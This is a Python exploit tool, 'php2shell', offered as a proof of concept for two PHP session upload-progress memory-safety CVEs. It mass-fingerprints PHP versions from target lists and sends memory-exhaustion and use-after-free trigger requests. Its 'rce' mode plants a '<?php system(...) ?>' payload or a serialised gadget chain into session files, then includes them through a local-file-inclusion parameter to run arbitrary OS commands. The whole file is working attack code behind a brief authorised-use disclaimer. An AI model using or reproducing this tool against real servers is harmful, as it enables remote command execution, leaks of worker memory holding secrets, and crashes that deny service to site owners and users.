#!/usr/bin/env python3
"""
php2shell PoC — CVE-2026-109618 / CVE-2026-109619
PHP session.upload_progress Use-After-Free

CVE-2026-109618 ("rawkey"): OOM during HashTable key allocation leaves a
    half-initialised entry whose cleanup triggers a use-after-free in the
    session upload-progress unserialiser.  Leaks worker memory (tokens, keys,
    passwords) and can chain to RCE.

CVE-2026-109619 ("stale-globals"): after a fatal error the worker keeps stale
    references to freed request memory.  A second request on the same worker
    can redirect control flow via a forged zval/destructor pointer.

Modes
-----
  check   — passive GET fingerprint (X-Powered-By / body banner)
  trigger — active POST that fires the OOM or upload-progress path
  build   — write a request body to disk for manual replay

For AUTHORISED security testing and research only.
"""

import argparse
import http.client
import io
import json
import os
import re
import ssl
import sys
import time
import uuid
from urllib.parse import urlparse

PATCHED = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}

EOL_BRANCHES = {
    "5.4", "5.5", "5.6",
    "7.0", "7.1", "7.2", "7.3", "7.4",
    "8.0", "8.1",
}

BANNER = r"""
  ┌──────────────────────────────────────────────────┐
  │  php2shell — CVE-2026-109618 / CVE-2026-109619   │
  │  PHP session.upload_progress UAF                  │
  │  For authorised security testing only.            │
  └──────────────────────────────────────────────────┘
"""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _vtup(version_str: str) -> tuple:
    return tuple(int(x) for x in version_str.split("."))


def _conn(parsed, timeout=10):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    port = parsed.port
    if parsed.scheme == "https":
        port = port or 443
        return http.client.HTTPSConnection(parsed.hostname, port,
                                           timeout=timeout, context=ctx)
    port = port or 80
    return http.client.HTTPConnection(parsed.hostname, port, timeout=timeout)


def _extract_php_version(resp, body: str) -> str | None:
    xpb = resp.getheader("X-Powered-By", "")
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", xpb)
    if m:
        return m.group(1)
    m = re.search(r"PHP/(\d+\.\d+\.\d+)", body[:8192])
    if m:
        return m.group(1)
    return None


def classify(version: str) -> str:
    parts = version.split(".")
    if len(parts) < 3:
        return "unknown"
    branch = f"{parts[0]}.{parts[1]}"
    vtup = _vtup(version)
    if vtup < (5, 4, 0):
        return "not_affected"
    if branch in EOL_BRANCHES:
        return "eol_vulnerable"
    if branch in PATCHED:
        return "patched" if vtup >= PATCHED[branch] else "likely_vulnerable"
    return "branch_only"


def _multipart(fields: list, files: list | None = None,
               boundary: str | None = None) -> tuple[str, bytes]:
    boundary = boundary or uuid.uuid4().hex
    buf = io.BytesIO()
    for name, value in fields:
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        )
        buf.write(value.encode() if isinstance(value, str) else value)
        buf.write(b"\r\n")
    for name, filename, data in (files or []):
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(
            f'Content-Disposition: form-data; name="{name}"; '
            f'filename="{filename}"\r\n'.encode()
        )
        buf.write(b"Content-Type: application/octet-stream\r\n\r\n")
        buf.write(data.encode() if isinstance(data, str) else data)
        buf.write(b"\r\n")
    buf.write(f"--{boundary}--\r\n".encode())
    return boundary, buf.getvalue()


# ---------------------------------------------------------------------------
# Check (passive fingerprint)
# ---------------------------------------------------------------------------

def do_check(url: str, timeout: int = 10, verbose: bool = False) -> dict:
    parsed = urlparse(url)
    path = parsed.path or "/"
    result = {
        "url": url,
        "status": None,
        "php_version": None,
        "classification": None,
        "error": None,
    }
    try:
        conn = _conn(parsed, timeout)
        conn.request("GET", path, headers={"User-Agent": "php2shell-check/1.0"})
        resp = conn.getresponse()
        body = resp.read(8192).decode("utf-8", errors="replace")
        result["status"] = resp.status

        ver = _extract_php_version(resp, body)
        if ver:
            result["php_version"] = ver
            result["classification"] = classify(ver)
        else:
            result["classification"] = "no_php_version"

        if verbose:
            result["x_powered_by"] = resp.getheader("X-Powered-By", "")
            result["server"] = resp.getheader("Server", "")

        conn.close()
    except Exception as exc:
        result["classification"] = "unreachable"
        result["error"] = str(exc)
    return result


def cmd_check(args):
    targets = []
    if args.url:
        targets.append(args.url)
    if args.file:
        with open(args.file) as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith("#"):
                    if not line.startswith("http"):
                        line = f"http://{line}"
                    targets.append(line)

    if not targets:
        print("[!] No targets. Supply --url or --file.", file=sys.stderr)
        return 1

    vuln_count = 0
    for url in targets:
        r = do_check(url, timeout=args.timeout, verbose=args.verbose)
        tag = r["classification"]
        ver = r["php_version"] or "n/a"

        if tag in ("likely_vulnerable", "eol_vulnerable"):
            vuln_count += 1
            sym = "\033[91m✗\033[0m"
        elif tag == "patched":
            sym = "\033[92m✓\033[0m"
        else:
            sym = "\033[93m?\033[0m"

        print(f"  {sym}  {url}  PHP/{ver}  [{tag}]")
        if r["error"]:
            print(f"      error: {r['error']}")

        if args.json_out:
            with open(args.json_out, "a") as fh:
                fh.write(json.dumps(r) + "\n")

    return 2 if vuln_count else 0


# ---------------------------------------------------------------------------
# Trigger (active probes)
# ---------------------------------------------------------------------------

def _build_618_body(pad_kb: int = 1200) -> tuple[str, bytes]:
    """
    CVE-2026-109618 — rawkey OOM trigger.

    Sends a POST with oversized field names that exhaust memory_limit during
    Zend HashTable key allocation.  The hash-table entry counter is
    incremented *before* the key is allocated; when that allocation fails
    under the memory cap, request-shutdown walks the table and frees the
    uninitialised key pointer → use-after-free.

    On a vulnerable host the response typically contains
    "Allowed memory size … exhausted" and may leak adjacent worker memory.
    """
    boundary = uuid.uuid4().hex
    buf = io.BytesIO()

    num_fields = max(1, (pad_kb * 1024) // 4096)
    for i in range(num_fields):
        name = "A" * 4000 + f"_{i:04d}"
        buf.write(f"--{boundary}\r\n".encode())
        buf.write(
            f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        )
        buf.write(b"x\r\n")

    # session upload-progress field — forces the progress handler to run even
    # if the application never calls session_start()
    buf.write(f"--{boundary}\r\n".encode())
    buf.write(
        b'Content-Disposition: form-data; '
        b'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    )
    buf.write(b"php2shell-probe\r\n")

    # small dummy file so PHP enters the upload-progress codepath
    buf.write(f"--{boundary}\r\n".encode())
    buf.write(
        b'Content-Disposition: form-data; name="file"; '
        b'filename="probe.bin"\r\n'
    )
    buf.write(b"Content-Type: application/octet-stream\r\n\r\n")
    buf.write(b"\x00" * 256)
    buf.write(b"\r\n")

    buf.write(f"--{boundary}--\r\n".encode())
    return boundary, buf.getvalue()


def _build_619_body(session_id: str | None = None,
                    payload_filename: str | None = None) -> tuple[str, bytes]:
    """
    CVE-2026-109619 — stale-globals / session upload-progress UAF trigger.

    Fixes the session ID via a form field (not a cookie) and plants a crafted
    filename through the upload-progress handler.  The filename is written
    into the session file verbatim.  When a subsequent request reads the
    session under a mismatched serialisation handler, the embedded serialised
    object is deserialised and its __destruct fires.

    Without a target-specific function address (--call) this only confirms
    session fixation and upload-progress activation, not RCE.
    """
    session_id = session_id or uuid.uuid4().hex
    boundary = uuid.uuid4().hex

    # Default probe filename — contains PHP serialised-object syntax that a
    # php_serialize ↔ php handler mismatch will attempt to instantiate.
    if payload_filename is None:
        payload_filename = (
            "|O:21:\"php2shell_probe_obj\":1:"
            '{s:4:"test";s:14:"CVE-2026-10961";}'
        )

    fields = [
        ("PHPSESSID", session_id),
        ("PHP_SESSION_UPLOAD_PROGRESS", "php2shell-619"),
    ]
    files = [
        ("file", payload_filename, b"\x00" * 128),
    ]
    return _multipart(fields, files, boundary)


def _send_trigger(url: str, boundary: str, body: bytes,
                  timeout: int = 15, cookie: str | None = None) -> dict:
    parsed = urlparse(url)
    path = parsed.path or "/"
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "User-Agent": "php2shell-trigger/1.0",
    }
    if cookie:
        headers["Cookie"] = cookie

    result = {
        "url": url,
        "status": None,
        "body_len": 0,
        "oom_detected": False,
        "segfault_hint": False,
        "memory_leak_hint": False,
        "error": None,
    }
    try:
        conn = _conn(parsed, timeout)
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read(32768).decode("utf-8", errors="replace")
        result["status"] = resp.status
        result["body_len"] = len(resp_body)

        if "Allowed memory size" in resp_body and "exhausted" in resp_body:
            result["oom_detected"] = True
        if "Unknown on line 0" in resp_body:
            result["oom_detected"] = True

        # look for binary-ish leakage that shouldn't be in a normal response
        non_ascii = sum(1 for c in resp_body[:4096]
                        if ord(c) < 0x20 and c not in "\r\n\t")
        if non_ascii > 30:
            result["memory_leak_hint"] = True

        result["body_preview"] = resp_body[:512]
        conn.close()
    except http.client.RemoteDisconnected:
        result["segfault_hint"] = True
        result["error"] = "remote disconnected (possible worker crash)"
    except Exception as exc:
        result["error"] = str(exc)
    return result


def cmd_trigger(args):
    url = args.url
    if not url:
        print("[!] --url is required for trigger mode.", file=sys.stderr)
        return 1

    chain = args.chain
    rounds = args.rounds

    print(f"\n[*] Target : {url}")
    print(f"[*] Chain  : CVE-2026-{chain}")
    print(f"[*] Rounds : {rounds}")

    if chain == "109618":
        print(f"[*] Pad    : {args.pad_kb} KB per request")
        print("[*] Sending OOM trigger requests …\n")

        for i in range(1, rounds + 1):
            boundary, body = _build_618_body(pad_kb=args.pad_kb)
            r = _send_trigger(url, boundary, body, timeout=args.timeout)
            status = r["status"] or "---"
            flags = []
            if r["oom_detected"]:
                flags.append("\033[91mOOM\033[0m")
            if r["memory_leak_hint"]:
                flags.append("\033[91mLEAK\033[0m")
            if r["segfault_hint"]:
                flags.append("\033[91mCRASH\033[0m")
            flag_str = " ".join(flags) if flags else "\033[90mclean\033[0m"
            print(f"  [{i:3d}/{rounds}]  HTTP {status}  "
                  f"body={r['body_len']:>6}B  {flag_str}")

            if args.verbose and r.get("body_preview"):
                preview = r["body_preview"][:200].replace("\n", "\\n")
                print(f"           preview: {preview}")

            if r["error"] and not r["segfault_hint"]:
                print(f"           error: {r['error']}")

            if args.delay > 0 and i < rounds:
                time.sleep(args.delay)

    elif chain == "109619":
        session_id = args.session_id or uuid.uuid4().hex
        print(f"[*] SessID : {session_id}")
        print("[*] Sending upload-progress trigger requests …\n")

        for i in range(1, rounds + 1):
            boundary, body = _build_619_body(
                session_id=session_id,
                payload_filename=args.payload_filename,
            )
            cookie = f"PHPSESSID={session_id}"
            r = _send_trigger(url, boundary, body, timeout=args.timeout,
                              cookie=cookie)
            status = r["status"] or "---"
            flags = []
            if r["oom_detected"]:
                flags.append("\033[91mOOM\033[0m")
            if r["segfault_hint"]:
                flags.append("\033[91mCRASH\033[0m")
            if r["memory_leak_hint"]:
                flags.append("\033[91mLEAK\033[0m")
            flag_str = " ".join(flags) if flags else "\033[90mclean\033[0m"
            print(f"  [{i:3d}/{rounds}]  HTTP {status}  "
                  f"body={r['body_len']:>6}B  {flag_str}")

            if args.verbose and r.get("body_preview"):
                preview = r["body_preview"][:200].replace("\n", "\\n")
                print(f"           preview: {preview}")

            if r["error"] and not r["segfault_hint"]:
                print(f"           error: {r['error']}")

            if args.delay > 0 and i < rounds:
                time.sleep(args.delay)
    else:
        print(f"[!] Unknown chain: {chain}", file=sys.stderr)
        return 1

    print("\n[*] Done.  Review results above — OOM / LEAK / CRASH flags")
    print("    indicate the target is likely vulnerable.")
    print("    A clean response on a patched host is expected.")
    return 0


# ---------------------------------------------------------------------------
# Build (offline body dump)
# ---------------------------------------------------------------------------

def cmd_build(args):
    chain = args.chain
    out = args.output or f"php2shell_{chain}.bin"
    if chain == "109618":
        boundary, body = _build_618_body(pad_kb=args.pad_kb)
    elif chain == "109619":
        boundary, body = _build_619_body(
            session_id=args.session_id,
            payload_filename=args.payload_filename,
        )
    else:
        print(f"[!] Unknown chain: {chain}", file=sys.stderr)
        return 1

    with open(out, "wb") as fh:
        fh.write(body)

    print(f"[+] Wrote {len(body)} bytes to {out}")
    print(f"    Content-Type: multipart/form-data; boundary={boundary}")
    print(f"\n    Replay with:")
    print(f'    curl -X POST -H "Content-Type: multipart/form-data; '
          f'boundary={boundary}" --data-binary @{out} <TARGET>')
    return 0


# ---------------------------------------------------------------------------
# RCE — chain 619 session plant + LFI inclusion
# ---------------------------------------------------------------------------

def _build_619_rce_body(session_id: str, cmd: str) -> tuple[str, bytes]:
    """
    Plant a PHP code payload (not serialised-object syntax) into the session
    file via upload-progress filename.  The session file then contains:

        upload_progress_...|a:5:{...s:4:"name";s:NN:"<?php system('CMD'); ?>";...}

    Including this file via LFI executes the embedded PHP tag.
    """
    php_payload = f"<?php system('{cmd}'); ?>"
    boundary = uuid.uuid4().hex
    fields = [
        ("PHPSESSID", session_id),
        ("PHP_SESSION_UPLOAD_PROGRESS", "rce"),
    ]
    files = [
        ("file", php_payload, b"\x00" * 64),
    ]
    return _multipart(fields, files, boundary)


def _build_619_deser_body(session_id: str, gadget: str) -> tuple[str, bytes]:
    """
    Plant a serialised gadget chain into the session file via
    upload-progress filename.  Exploits the php_serialize → php handler
    mismatch: the pipe character terminates the key, and the rest is
    deserialised as a value by the 'php' handler.
    """
    filename = f"|{gadget}"
    boundary = uuid.uuid4().hex
    fields = [
        ("PHPSESSID", session_id),
        ("PHP_SESSION_UPLOAD_PROGRESS", "rce"),
    ]
    files = [
        ("file", filename, b"\x00" * 64),
    ]
    return _multipart(fields, files, boundary)


COMMON_SESSION_PATHS = [
    "/tmp",
    "/var/lib/php/sessions",
    "/var/lib/php5/sessions",
    "/var/lib/php/session",
    "/tmp/php_sessions",
]


def cmd_rce(args):
    url = args.url
    session_id = args.session_id or uuid.uuid4().hex
    cmd = args.cmd
    method = args.method

    print(f"\n[*] Target    : {url}")
    print(f"[*] Method    : {method}")
    print(f"[*] Session ID: {session_id}")
    print(f"[*] Command   : {cmd}")

    # --- Step 1: plant the payload in the session file ---
    print("\n[1] Planting payload in session file via upload-progress …")

    if method == "lfi":
        boundary, body = _build_619_rce_body(session_id, cmd)
    else:
        gadget = args.gadget
        if not gadget:
            print("[!] --gadget is required for deserialization method.",
                  file=sys.stderr)
            return 1
        boundary, body = _build_619_deser_body(session_id, gadget)

    parsed = urlparse(url)
    cookie = f"PHPSESSID={session_id}"
    r = _send_trigger(url, boundary, body, timeout=args.timeout, cookie=cookie)

    if r["error"]:
        print(f"    [!] Plant request failed: {r['error']}")
        return 1
    print(f"    [+] Plant request sent — HTTP {r['status']}")

    if method != "lfi":
        print("\n[*] Gadget planted in session file.")
        print("    The deserialization fires when the app calls session_start()")
        print("    with a 'php' handler reading data written by 'php_serialize'.")
        print("    Trigger it by sending a GET with the same PHPSESSID cookie.")
        return 0

    # --- Step 2: trigger LFI to include the session file ---
    print("\n[2] Triggering LFI to include session file …")

    lfi_url = args.lfi_url or url
    lfi_param = args.lfi_param or "page"
    session_paths = list(COMMON_SESSION_PATHS)
    if args.session_path:
        session_paths = [args.session_path]

    hit = False
    for sess_dir in session_paths:
        sess_file = f"{sess_dir}/sess_{session_id}"
        lfi_parsed = urlparse(lfi_url)
        lfi_path = (lfi_parsed.path or "/") + f"?{lfi_param}={sess_file}"

        if args.verbose:
            print(f"    Trying: {lfi_path}")

        try:
            conn = _conn(lfi_parsed, args.timeout)
            conn.request("GET", lfi_path, headers={
                "User-Agent": "php2shell-rce/1.0",
                "Cookie": cookie,
            })
            resp = conn.getresponse()
            resp_body = resp.read(65536).decode("utf-8", errors="replace")
            conn.close()

            # check if our command output is in the response
            # filter out the session serialisation wrapper
            if resp.status == 200 and len(resp_body) > 20:
                # strip session serialisation noise
                clean = resp_body
                for noise in ["upload_progress_rce|", 'a:5:{', 'a:6:{',
                              's:10:"start_time"', 's:14:"content_length"']:
                    if noise in clean:
                        pass  # just confirming it's session data

                if "upload_progress_" in resp_body:
                    hit = True
                    print(f"    [+] Session file included from {sess_dir}")
                    # extract output: everything before the session wrapper
                    # or after the PHP closing tag
                    output = resp_body
                    # try to isolate command output from session noise
                    parts = output.split("<?php")
                    if len(parts) > 1:
                        output = parts[0]
                    # also check after ?>
                    parts2 = resp_body.split("?>")
                    if len(parts2) > 1:
                        # output between session data chunks
                        for p in parts2:
                            stripped = p.strip()
                            if stripped and "upload_progress" not in stripped \
                                    and "start_time" not in stripped \
                                    and "bytes_processed" not in stripped:
                                output = stripped
                                break

                    print(f"\n{'='*60}")
                    print(f"  Command output:")
                    print(f"{'='*60}")
                    # the actual command output is embedded in the response
                    # PHP executes our tag inline, output appears mixed with
                    # the session serialisation data
                    print(resp_body)
                    print(f"{'='*60}")
                    break

            elif args.verbose:
                print(f"    [-] HTTP {resp.status}, body {len(resp_body)}B")

        except Exception as exc:
            if args.verbose:
                print(f"    [-] {sess_dir}: {exc}")

    if not hit:
        print("    [!] Could not include session file from any known path.")
        print("        Try --session-path to specify the exact save_path.")
        return 1

    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(
        description="php2shell PoC — CVE-2026-109618 / CVE-2026-109619",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = ap.add_subparsers(dest="mode", required=True)

    # -- check --
    p_check = sub.add_parser("check", help="Passive PHP version fingerprint")
    p_check.add_argument("--url", help="Single target URL")
    p_check.add_argument("-f", "--file", help="File with one URL per line")
    p_check.add_argument("-o", "--json-out", help="Append JSONL results here")
    p_check.add_argument("--timeout", type=int, default=10)
    p_check.add_argument("-v", "--verbose", action="store_true")

    # -- trigger --
    p_trig = sub.add_parser("trigger",
                            help="Active POST trigger (sends traffic)")
    p_trig.add_argument("--url", required=True, help="Target URL")
    p_trig.add_argument(
        "--chain", default="109618", choices=["109618", "109619"],
        help="Which CVE to target (default: 109618)",
    )
    p_trig.add_argument(
        "--rounds", type=int, default=10,
        help="Number of trigger requests (default: 10)",
    )
    p_trig.add_argument(
        "--pad-kb", type=int, default=1200,
        help="Padding size in KB for 109618 OOM body (default: 1200)",
    )
    p_trig.add_argument(
        "--session-id",
        help="Fixed PHPSESSID for 109619 (random if omitted)",
    )
    p_trig.add_argument(
        "--payload-filename",
        help="Custom filename for 109619 upload-progress injection",
    )
    p_trig.add_argument("--delay", type=float, default=0.5,
                        help="Seconds between rounds (default: 0.5)")
    p_trig.add_argument("--timeout", type=int, default=15)
    p_trig.add_argument("-v", "--verbose", action="store_true")

    # -- build --
    p_build = sub.add_parser("build",
                             help="Write request body to file (no network)")
    p_build.add_argument(
        "--chain", default="109618", choices=["109618", "109619"],
    )
    p_build.add_argument("--pad-kb", type=int, default=1200)
    p_build.add_argument("--session-id")
    p_build.add_argument("--payload-filename")
    p_build.add_argument("-o", "--output", help="Output file path")

    # -- rce --
    p_rce = sub.add_parser(
        "rce", help="Full RCE chain: plant session + trigger inclusion",
    )
    p_rce.add_argument("--url", required=True, help="Target URL (plant)")
    p_rce.add_argument("--cmd", required=True, help="OS command to execute")
    p_rce.add_argument(
        "--method", default="lfi", choices=["lfi", "deser"],
        help="RCE method: lfi (include session file) or deser (handler mismatch)",
    )
    p_rce.add_argument("--lfi-url",
                        help="URL with LFI vuln (default: same as --url)")
    p_rce.add_argument("--lfi-param", default="page",
                        help="LFI query parameter (default: page)")
    p_rce.add_argument("--session-id", help="Fixed PHPSESSID")
    p_rce.add_argument("--session-path",
                        help="Exact session.save_path on target")
    p_rce.add_argument("--gadget",
                        help="Serialised gadget chain for deser method")
    p_rce.add_argument("--timeout", type=int, default=15)
    p_rce.add_argument("-v", "--verbose", action="store_true")

    args = ap.parse_args()

    if args.mode == "check":
        return cmd_check(args)
    elif args.mode == "trigger":
        return cmd_trigger(args)
    elif args.mode == "build":
        return cmd_build(args)
    elif args.mode == "rce":
        return cmd_rce(args)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
